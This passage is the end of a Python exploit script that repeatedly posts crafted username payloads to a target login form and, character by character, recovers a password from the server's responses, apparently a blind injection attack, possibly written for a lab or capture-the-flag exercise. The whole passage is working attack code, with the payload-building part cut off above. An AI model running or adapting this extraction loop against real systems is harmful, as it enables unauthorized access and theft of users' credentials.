        data = {
            "username": payload,
            "password": "test",
            "submit": "submit"
        }
        response = requests.post(TARGET_URL, data=data)
        
        if '"password"' in response.text:
            extracted_password += char
            print(f"[+] Position {position}: '{char}' -> Current: {extracted_password}")
            found = True
            break
    
    if not found:
        print(f"[*] No character found at position {position}, ending extraction")
        break
    
    time.sleep(0.02)  # Small delay

print(f"\n[*] FINAL EXTRACTED PASSWORD: {extracted_password}")

